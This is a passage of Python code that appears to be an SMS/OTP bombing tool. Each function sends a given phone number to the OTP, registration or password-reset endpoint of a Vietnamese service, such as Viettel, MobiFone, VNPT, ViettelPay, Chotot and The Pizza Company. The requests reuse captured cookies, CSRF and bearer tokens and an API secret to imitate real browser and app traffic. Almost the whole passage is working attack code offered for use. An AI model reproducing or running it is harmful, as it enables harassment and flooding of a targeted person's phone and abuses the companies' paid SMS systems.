        'DMX_Personal': '%7B%22CustomerId%22%3A0%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerMail%22%3Anull%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22Address%22%3Anull%2C%22CurrentUrl%22%3Anull%2C%22ProvinceId%22%3A3%2C%22ProvinceName%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22DistrictId%22%3A0%2C%22DistrictType%22%3Anull%2C%22DistrictName%22%3Anull%2C%22WardId%22%3A0%2C%22WardType%22%3Anull%2C%22WardName%22%3Anull%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22HasLocation%22%3Afalse%7D',
        'MWG_PRODUCT_BASIC_DB': '8abgNefqT1OLKPUy9CdlGphoh4YH1TCUQ2O8qfDSoTekJWN9DlHZHg--',
        'MWG_CART_HAVE_PRODUCT': '',
        'MWG_CART_SS_10': 'CfDJ8HejTqTgEXlOoIeW1CutofMSwf1KBlmYkBfvOjkoALoH4r9xxvwWrnep7coXkJ%2Fr4%2BKm0gHg13xdJtoqPNe%2BrMAf00o06k6zN5Aru0jt5sJ1EvaRjAh2Yi5TnF8wskNe2GIa29%2FCi5DWsgrcDyw6Rej%2FjlOIR0Cntv6woICxpxua',
        '.AspNetCore.Antiforgery.NTCLGRwicAo': 'CfDJ8AOPS3HyLgBFlxCZc71KlZMgfnidzWeReJosd0ECag31BBIyv_udfMtl7ykWkPlIQyiCQUZDw9-HMt1E5Kp16PBFLng9tVdT6Ny-RW6zRfoujkBkZZ63o43Bqr9XfvDgetbCthg1rNQeScZ8kHw80_c',
        'ASP.NET_SessionId': 'cbfs1ut3q3kq5wzq4cdmk04o',
        'MWG_ORDERHISTORY_SS_10': 'CfDJ8AOPS3HyLgBFlxCZc71KlZM%2B7YdGYg1Uay0HvcY5I9exurDcJwezpyegUKYLmXZrsIZCsThbwITQlbQYm%2FwU5on0n3LaP4VSt96mph3WHOviP0y0cgaEGb5QPwtDGFhmyLn27SYEE5cPnWZsV9HLxfXjJnemr8utUw94BP29JXXk',
        'TBMCookie_3209819802479625248': '837581001721796736QEZtdvzz0Kums067KBceEASslN8=',
        'SvID': 'ak213|ZqCIh|ZqCBh',
        '___utmvc': "navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dtrue,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=",
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': "___utmvm=###########; .AspNetCore.Antiforgery.PgYZnA9bRvk=CfDJ8MYaQjD04aBHj9meZl7eRqI3A2HboqNnhlow3nIbtSN1KebuCGK6Cc6IuNcfibOGjCM8Fz5YBSZbkIvW3ggg0LhTlWWOaTsLCwIM_9Zd3fdeEQuEjuLde5-WANEX1rQLaVVWdWxnFBWUqvXyCPq9PL8; DMX_Personal=%7B%22CustomerId%22%3A0%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerMail%22%3Anull%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22Address%22%3Anull%2C%22CurrentUrl%22%3Anull%2C%22ProvinceId%22%3A3%2C%22ProvinceName%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22DistrictId%22%3A0%2C%22DistrictType%22%3Anull%2C%22DistrictName%22%3Anull%2C%22WardId%22%3A0%2C%22WardType%22%3Anull%2C%22WardName%22%3Anull%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22HasLocation%22%3Afalse%7D; MWG_PRODUCT_BASIC_DB=8abgNefqT1OLKPUy9CdlGphoh4YH1TCUQ2O8qfDSoTekJWN9DlHZHg--; MWG_CART_HAVE_PRODUCT=; MWG_CART_SS_10=CfDJ8HejTqTgEXlOoIeW1CutofMSwf1KBlmYkBfvOjkoALoH4r9xxvwWrnep7coXkJ%2Fr4%2BKm0gHg13xdJtoqPNe%2BrMAf00o06k6zN5Aru0jt5sJ1EvaRjAh2Yi5TnF8wskNe2GIa29%2FCi5DWsgrcDyw6Rej%2FjlOIR0Cntv6woICxpxua; .AspNetCore.Antiforgery.NTCLGRwicAo=CfDJ8AOPS3HyLgBFlxCZc71KlZMgfnidzWeReJosd0ECag31BBIyv_udfMtl7ykWkPlIQyiCQUZDw9-HMt1E5Kp16PBFLng9tVdT6Ny-RW6zRfoujkBkZZ63o43Bqr9XfvDgetbCthg1rNQeScZ8kHw80_c; ASP.NET_SessionId=cbfs1ut3q3kq5wzq4cdmk04o; MWG_ORDERHISTORY_SS_10=CfDJ8AOPS3HyLgBFlxCZc71KlZM%2B7YdGYg1Uay0HvcY5I9exurDcJwezpyegUKYLmXZrsIZCsThbwITQlbQYm%2FwU5on0n3LaP4VSt96mph3WHOviP0y0cgaEGb5QPwtDGFhmyLn27SYEE5cPnWZsV9HLxfXjJnemr8utUw94BP29JXXk; TBMCookie_3209819802479625248=837581001721796736QEZtdvzz0Kums067KBceEASslN8=; SvID=ak213|ZqCIh|ZqCBh; ___utmvc=navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dtrue,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=",
        'Origin': 'https://www.nhathuocankhang.com',
        'Referer': 'https://www.nhathuocankhang.com/lich-su-mua-hang/dang-nhap',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'phoneNumber': phone,
        'isReSend': 'false',
        'sendOTPType': '1',
        '__RequestVerificationToken': 'CfDJ8AOPS3HyLgBFlxCZc71KlZND_qpIxPX4mlZOiveWgRjeJWH_yXfoR4Ya8tjSSmB6J6ldM4fc18FYhry1DWluW9yLUZ594p5VTlRZVWnZtnADBr69zqmqDb018jzjpn6F-Hjibt7FRQfzugl7BjkJqKs',
    }

    try:
        response = requests.post(
            'https://www.nhathuocankhang.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
            cookies=cookies,
            headers=headers,
            data=data,
            timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("NHATHUOCANKHANG | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("NHATHUOCANKHANG | TRẠNG THÁI : Thất Bại Fuck")



def mutosi(phone):
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Authorization': 'Bearer 226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'Origin': 'https://mutosi.com',
        'Referer': 'https://mutosi.com/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'phone': phone,
        'token': '03AFcWeA5TIIo9s4Dw3Fu74mJkh4sTym08PBjdfU9Z89ZlvYZMsfwd3mvbsko32sRTG0xZ9-u2UOFZthXMuFP_yHVLO0Bzm49cFRHLV72VH8I95zGpJNtIFtV7mpncX_5na0ejZTpYhOy8Y1el76y0jtakSygSAjgH7d4sTcxhQefjY3ZOEB8mEXL39tCbbKyH2umS4arADTcRM5S2MN4QJPZSOr9qF54T5AaAxJAC6KsOYzocbePO8Xg-cuy_J0me7U8I4J1TM7E0DLKjzBvXQYnoJW-csoGyk1AdQ2jB3j0trnXxz6pOQiwpO_nuYBnNkvj0Uzpq2VsXl0yD-3oBmlQlO7hRoTzDm2b4svOL8yHol5eHlNnKwLd0Fa7eErz2UMAyh6JCfx2svvKNlqptGTRYJOQJQXwFIT-rvmF1TZ1mRtNzAS3A-Iu5iEwbKhMtyI0SmK_NZ-bW0sCKcPH9oXkMkMQRLEtD3qmY4pUUsOIvgzLItJ_RKA9lK5J3Ys9QZdnbosWnDiq66HVtSk25HpVStNjdQUAYFdN3AWRsXo9PR7q2R9dGDsUA-scH2TEm8mHK2vHiSCGGToauer1XR7bCuPkFb8rRhFUF_rXAAmDgLefk4z0EH95gIf30-Xov1W_I985nmhHhrrTe6rm6c43fIWU1t-ogW_HBHY5tQwJC-NmAA8ncZh4ranwR0lBilhMglNGJUglvl0-XL4N--ouK3dkpXRhcmCRdlx4XCcCwDYRO61Cm8Gp7QEE0Zn04OMU9GfnAS1uGbWeWSQ4X3b-1ruzyzYr9pqRNdkOpRP1HDdLinyMNCTm1Hw1CbpQ-mXaPMpr9Ltej',
        'source': 'web_consumers',
    }

    try:
        response = requests.post('https://api-omni.mutosi.com/client/auth/reset-password/send-phone', headers=headers, json=json_data, timeout=10)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("MUTOSI | TRẠNG THÁI : Thành Công")
    except requests.exceptions.RequestException:
        print("MUTOSI | TRẠNG THÁI : Thất Bại Fuck")


def vieon(phone):
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NDgyNzIwODUsImp0aSI6IjRlODY2ZjBjZGFjOWI3MmRmZTFkZTA2ZTVmMGM4Zjc2IiwiYXVkIjoiIiwiaWF0IjoxNzQ4MDk5Mjg1LCJpc3MiOiJWaWVPbiIsIm5iZiI6MTc0ODA5OTI4NCwic3ViIjoiYW5vbnltb3VzXzdlY2Q5YzZhYjZiZDE2YmEzMGQ0ZWMxNzBiZWFmMzBjLWFkYWYwNjUwYTgwMzk3NmYzNTI2NWRhMTRmY2NiNDI2LTE3NDgwOTkyODUiLCJzY29wZSI6ImNtOnJlYWQgY2FzOnJlYWQgY2FzOndyaXRlIGJpbGxpbmc6cmVhZCIsImRpIjoiN2VjZDljNmFiNmJkMTZiYTMwZDRlYzE3MGJlYWYzMGMtYWRhZjA2NTBhODAzOTc2ZjM1MjY1ZGExNGZjY2I0MjYtMTc0ODA5OTI4NSIsInVhIjoiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDYuMDsgTmV4dXMgNSBCdWlsZC9NUkE1OE4pIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzYuMC4wLjAgTW9iaWxlIFNhZmFyaS81MzcuMzYiLCJkdCI6IndlYiIsIm10aCI6ImFub255bW91c19sb2dpbiIsIm1kIjoiV2luZG93cyAxMCIsImlzcHJlIjowLCJ2ZXJzaW9uIjoiIn0.mRNkW9b_skkI6JYfCVAoj7B7LstyQ0E_0P4jnt5GY-8",
        "content-type": "application/json",
        "origin": "https://vieon.vn",
        "priority": "u=1, i",
        "referer": "https://vieon.vn/auth/?destination=/?srsltid=AfmBOopdZYv_U2sYd3ed1KkwGP_2i1nOGzd7ZAn7DaGrXaOWGtkLD3Zx&page=/",
        "sec-ch-ua": '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36",
    }
    params = {
        "platform": "web",
        "ui": "012021",
    }
    json_data = {
        "username": f"{phone}",
        "country_code": "VN",
        "model": "Windows 10",
        "device_id": "7ecd9c6ab6bd16ba30d4ec170beaf30c",
        "device_name": "Chrome/136",
        "device_type": "desktop",
        "platform": "web",
        "ui": "012021",
    }
    response = requests.post(
        "https://api.vieon.vn/backend/user/v2/register",
        params=params,
        headers=headers,
        json=json_data,
        timeout=10,
    )
def best_inc(phone):
    headers = {
        "Host": "v9-cc.800best.com",
        "Connection": "keep-alive",
        # 'Content-Length': '53',
        "x-timezone-offset": "7",
        "x-auth-type": "web-app",
        "x-nat": "vi-VN",
        "x-lan": "VI",
        "authorization": "null",
        "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
        "content-type": "application/json",
        "accept": "application/json",
        "lang-type": "vi-VN",
        "Origin": "https://best-inc.vn",
        "X-Requested-With": "mark.via.gp",
        "Sec-Fetch-Site": "cross-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://best-inc.vn/",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
    }
    data = {"phoneNumber": phone, "verificationCodeType": 1}
    response = requests.post(
        "https://v9-cc.800best.com/uc/account/sendsignupcode",
        data=data,
        headers=headers,
    )
def pizzacompany(phone):
    cookies = {
        "_gcl_au": "1.1.607819339.1691276885",
        "_ga": "GA1.2.453948248.1691276886",
        "_gid": "GA1.2.698696022.1691276886",
        "_tt_enable_cookie": "1",
        "_ttp": "bwCYo8Ir1_CxxhKbysJDt5JtlQ7",
        "_fbp": "fb.1.1691276888170.1960321660",
        ".Nop.Antiforgery": "CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMdBq9So1BpAShECqnbe4x79hVD-kSPUOvSsZXdlopovNftYPw0l618PP3jBxWlS6DrW8ZwRFgYyfMxRk4LVDYk1oqhci4h4z6nxsio4sRCpVfQ5PDeD_cOZBqbvNqQrfl8",
        ".Nop.Customer": "ccaefc12-aefb-4b4d-8b87-776f2ee9af1f",
        ".Nop.TempData": "CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMdhAs4Uj_AWcS9nus5bsNq7oJeUYXskCpd7NOOmUhHC6O5SoOmOuoB3SPldKVFXv1Vb_1P3Dt9jKaGFxsnoiu6YyCICvW4HiUNIz8FLPxXRz1gRZofRDec2--_PkEYAHM914UlVbGNyajdpimnWw70-wpCHoT5hmruwLhFMTe_qew",
    }
    headers = {
        "Host": "thepizzacompany.vn",
        # 'content-length': '199',
        "accept": "*/*",
        "x-requested-with": "XMLHttpRequest",
        "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "origin": "https://thepizzacompany.vn",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://thepizzacompany.vn/Otp",
        # 'accept-encoding': 'gzip, deflate, br',
        "accept-language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
    }
    data = {
        "phone": f"{phone}",
        "__RequestVerificationToken": "CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMfbQwvToQkkGuj4TN2sRcEQ1WYLq8FZcCaAf8P9JHU46UhpBthj5H4JH3oJjwi0hx_zMAPEMRGPK6X6QnCzHwfMW_RhUnFUsBEDrss3f32LBDTUcbq9dohqqQZr2VFE9Ns",
    }
    response = requests.post(
        "https://thepizzacompany.vn/customer/ResendOtp",
        cookies=cookies,
        headers=headers,
        data=data,
    )
def tv360(phone):
    cookies = {
        "device-id": "s%3Awap_bd36142f-3f9e-48b7-8702-eaf24eee85b2.E7UHat%2BZVBxnrbp3QBamQj%2FOFe%2FIWM9r5jvcJXWNJTQ",
        "shared-device-id": "wap_bd36142f-3f9e-48b7-8702-eaf24eee85b2",
        "screen-size": "s%3A958x1108.bDeJQcQtOt2QZaYNOtI7iRq2FRFZKUOf6pU9c22AnBc",
        "_gid": "GA1.2.2130656950.1748097972",
        "_gcl_au": "1.1.212507564.1748097972",
        "img-ext": "avif",
        "_gat_UA-180935206-1": "1",
        "_ga": "GA1.1.326740773.1748097972",
        "G_ENABLED_IDPS": "google",
        "_ga_D7L53J0JMS": "GS2.1.s1748148810$o2$g1$t1748148834$j36$l0$h0$d5NXBFeEoRqtVuyaiUato3GCbCX3_0VNyMw",
        "_ga_E5YP28Y8EF": "GS2.1.s1748148810$o2$g1$t1748148834$j0$l0$h0",
    }
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "Connection": "keep-alive",
        "Content-Type": "application/json",
        "Origin": "http://tv360.vn",
        "Referer": "http://tv360.vn/login?r=http%3A%2F%2Ftv360.vn%2F",
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36",
        "startTime": "1748148834187",
        "tz": "Asia/Saigon",
    }
    json_data = {
        "msisdn": phone,
    }
    response = requests.post(
        "http://tv360.vn/public/v1/auth/get-otp-login",
        cookies=cookies,
        headers=headers,
        json=json_data,
        timeout=10,
        verify=False,
    )
def vtmoney(phone):
    cookies = {
        "_cfuvid": "IbrAhg9ruybk5tvcyo2YDibVieT0lAMzt5HRVyDkd8U-1748153577558-0.0.1.1-604800000",
    }
    headers = {
        "host": "api8.viettelpay.vn",
        "content-type": "application/json",
        "accept": "*/*",
        "app-version": "8.8.28",
        "product": "VIETTELPAY",
        "type-os": "ios",
        "accept-encoding": "gzip;q=1.0, compress;q=0.5",
        "accept-language": "vi",
        "imei": "70B0EA3D-7FC0-45BA-8303-E83D802C004B",
        "device-name": "iPhone",
        "user-agent": "Viettel Money/8.8.28 (com.viettel.viettelpay; build:2; iOS 18.3.2) Alamofire/4.9.1",
        "content-length": "73",
        "os-version": "18.3.2",
        #'cookie': '_cfuvid=IbrAhg9ruybk5tvcyo2YDibVieT0lAMzt5HRVyDkd8U-1748153577558-0.0.1.1-604800000',
        "authority-party": "APP",
    }
    json_data = {
        "identityType": "msisdn",
        "type": "REGISTER",
        "identityValue": phone,
    }
    response = requests.post(
        "https://api8.viettelpay.vn/customer/v2/accounts/register",
        cookies=cookies,
        headers=headers,
        json=json_data,
        timeout=10,
    )
def vtpost(phone):
    headers = {
        "host": "otp-verify.okd.viettelpost.vn",
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json;charset=utf-8",
        "accept-encoding": "gzip, deflate, br",
        "user-agent": "ViettelPost/2 CFNetwork/3826.400.120 Darwin/24.3.0",
        "content-length": "84",
        "accept-language": "vi-VN,vi;q=0.9",
    }
    json_data = {
        "account": phone,
        "function": "SSO_REGISTER",
        "type": "PHONE",
        "otpType": "NUMBER",
    }
    response = requests.post(
        "https://otp-verify.okd.viettelpost.vn/api/otp/sendOTP",
        headers=headers,
        json=json_data,
        timeout=10,
    )
def mobifone(phone):
    headers = {
        "Host": "api.mobifone.vn",
        "uuid": "E1EC4517-6B6B-4521-BFAF-9EFA9CE86422",
        "Accept": "*/*",
        "langcode": "vi",
        "timeStamp": "1748156139.314017",
        "appversion": "4.17.4",
        "Accept-Encoding": "br;q=1.0, gzip;q=0.9, deflate;q=0.8",
        "Accept-Language": "vi-VN;q=1.0",
        "osinfo": "iOS, 18.3.2",
        "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
        "deviceinfo": "iPhone 11",
        "User-Agent": "MyMobiFone/4.17.4 (vms.com.MyMobifone; build:8; iOS 18.3.2) Alamofire/5.9.1",
        "Content-Length": "15",
        "Connection": "keep-alive",
        "apisecret": "UEJ34gtH345DFG45G3ht1",
    }
    data = ({"phone": phone},)
    response = requests.post(
        "https://api.mobifone.vn/api/auth/getloginotp", headers=headers, data=data
    )
def myvnpt(phone):
    headers = {
        "Host": "api-myvnpt.vnpt.vn",
        "Content-Type": "application/json",
        "Accept": "*/*",
        "Connection": "keep-alive",
        "Language": "vi_VN",
        "User-Agent": "My VNPT/5.1.5 (com.vnp.myvinaphone; build:2025051802; iOS 18.3.2) Alamofire/5.10.2",
        "Accept-Language": "vi-VN;q=1.0",
        "Accept-Encoding": "br;q=1.0, gzip;q=0.9, deflate;q=0.8",
        "Device-Info": "6C043B99-B731-4EEC-82E3-04E3D708CC42|||iOS||5.1.5-2025051802|iPhone 11 18.3.2|",
    }
    json_data = {"otp_service": "authen_msisdn", "msisdn": phone, "tinh_id": ""}
    try:
        r = requests.post(
            "https://api-myvnpt.vnpt.vn/mapi_v2/services/otp_send",
            headers=headers,
            json=json_data,
            timeout=10,
        )
        return r.json()
    except Exception as e:
        return {"error": str(e)}
def chotot(phone):
    cookies = {
        "_cfuvid": "QPSbcekUnptfoxekeMrE.8_QqQpa6TY6.bC.PwL.WFI-1748261723349-0.0.1.1-604800000",
    }
    headers = {
        "host": "gateway.chotot.com",
        "content-type": "application/json",
        "fingerprint": "3855FD92-0C1D-4CD9-98D6-7FEED088CC41",
        "accept": "*/*",
        "ct-fingerprint": "3855FD92-0C1D-4CD9-98D6-7FEED088CC41",
        "ct-platform": "ios",
        "accept-language": "vi-VN;q=1.0",
        "accept-encoding": "br;q=1.0, gzip;q=0.9, deflate;q=0.8",
        "ct-idfp": "ea26825a-e91d-5a1d-a29b-c2ea6c40151e",
        "ct-app-version": "4.84.0",
        "user-agent": "ChoTot/4.84.0 (vn.chotot.iosapp; build:2505211426; iOS 18.3.2) Alamofire/5.9.1",
        "content-length": "37",
    }
    json_data = {"phone": phone, "app_id": "ios"}
    response = requests.post(
        "https://gateway.chotot.com/v2/public/auth/send_otp_verify",
        headers=headers,
        json=json_data,
        timeout=10,
    )
    # không mã
def bhx(phone):
    headers = {
        "host": "apibhx.tgdd.vn",
        "content-type": "application/json",
        "reversehost": "http://bhxapi.live",
        "accept": "application/json",
        "authorization": "Bearer E976DCB40A1EBFC9BF8597D8D35951D9",
        "appscreen": "Profile",
        "accept-language": "vi-VN,vi;q=0.9",
        "accept-encoding": "gzip, deflate, br",
        "platform": "ios",
        "deviceid": "9FFC85BF-9173-4C97-837E-B7684816D992",
        "content-length": "141",
        "user-agent": "iOS||18.3.2||9FFC85BF-9173-4C97-837E-B7684816D992||VersionApp 2.0.18",
        "xapikey": "bhx-api-core-2022",
    }
    json_data = {
        "UserName": phone,
        "DeviceId": "9FFC85BF-9173-4C97-837E-B7684816D992",
        "OS": "ios",
        "Relogin": False,
        "DeviceName": "iPhone 11",
        "isOnlySMS": 0,
    }
    response = requests.post(
        "https://apibhx.tgdd.vn/User/LoginByNumberPhone",
        headers=headers,
        json=json_data,
        timeout=10,
    )
def viettel(phone):
    phone = f"+84{phone[1:]}" if phone.startswith("0") else phone
    cookies = {
        "D1N": "7b9e17f12dca137f1a880e2af6cd3eef",
        "_gcl_au": "1.1.208220017.1748150523",
        "_fbp": "fb.1.1748150523616.32532520975271478",
        "laravel_session": "RUF81Shw8kXT6OaPXetZf6ehCU5sHs4BfgMvtbSO",
        "_ga": "GA1.2.621948631.1748150523",
        "_gid": "GA1.2.2110971541.1748270629",
        "redirectLogin": "https://viettel.vn/myviettel",
        "__zi": "3000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIVF8wXhueR1ealoR7ennq1nchDikt86ql0QypswiSUGCDgplVl.1",
        "_ga_Z30HDXVFSV": "GS2.1.s1748270629$o2$g1$t1748270651$j0$l0$h0",
        "XSRF-TOKEN": "eyJpdiI6IjkxVmltU0xWcGVzV0JkaTlQN0tjYXc9PSIsInZhbHVlIjoiemhPYzVvVWZjaTdpQTlTOXZMenFkUkVCb0hvM3NZSnNZRGpldTNBbUJqbEF4OEkxMjVmelhmaUN4Y2pnQWEwOSIsIm1hYyI6IjRmYzhiOTM5MWE3OGQ4MjBmODlmY2ZjOGI3ODQ4MzJjODBkMWI5ZDNjMDM3M2NlZGE1NTc1N2IzNmQ2MGZiNWUifQ%3D%3D",
        "_ga_VH8261689Q": "GS2.1.s1748270629$o2$g1$t1748270976$j6$l0$h0$d0Vv7D8zlRK8nnDS-8CuV40LhSOaocF89YQ",
    }
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "content-type": "application/json;charset=UTF-8",
        "origin": "https://viettel.vn",
        "priority": "u=1, i",
        "referer": "https://viettel.vn/myviettel",
        "sec-ch-ua": '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36",
        "x-csrf-token": "pWLE6D0MSH5thBkXsqgrMS1syICTiEMVe15d5b8U",
        "x-requested-with": "XMLHttpRequest",
        "x-xsrf-token": "eyJpdiI6IjkxVmltU0xWcGVzV0JkaTlQN0tjYXc9PSIsInZhbHVlIjoiemhPYzVvVWZjaTdpQTlTOXZMenFkUkVCb0hvM3NZSnNZRGpldTNBbUJqbEF4OEkxMjVmelhmaUN4Y2pnQWEwOSIsIm1hYyI6IjRmYzhiOTM5MWE3OGQ4MjBmODlmY2ZjOGI3ODQ4MzJjODBkMWI5ZDNjMDM3M2NlZGE1NTc1N2IzNmQ2MGZiNWUifQ==",
    }
    json_data = {
        "phone": phone,
        "typeCode": "DI_DONG",
        "actionCode": "myviettel://login_mobile",
        "type": "otp_login",
    }
    response = requests.post(
        "https://viettel.vn/api/getOTPLoginCommon",
        cookies=cookies,
        headers=headers,
        json=json_data,
        timeout=10,
    )
def sunwin(phone):
    headers = {
        "accept": "*/*",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "authorization": "85d840e433c74f39a3d50d0f3e66cba9",
        "origin": "https://play.sun.win",
        "priority": "u=1, i",
        "referer": "https://play.sun.win/",
        "sec-ch-ua": '"Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36",
    }
    params = {
        "command": "getOTPCode",
        "type": "1",
        "phone": phone,
    }
    response = requests.get(
        "https://api.azhkthg1.net/paygate", params=params, headers=headers
    )
    # khong mã
def hitclb(phone):
    headers = {
        "accept": "*/*",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "content-type": "application/json",
        "origin": "https://i.hit.club",
        "priority": "u=1, i",
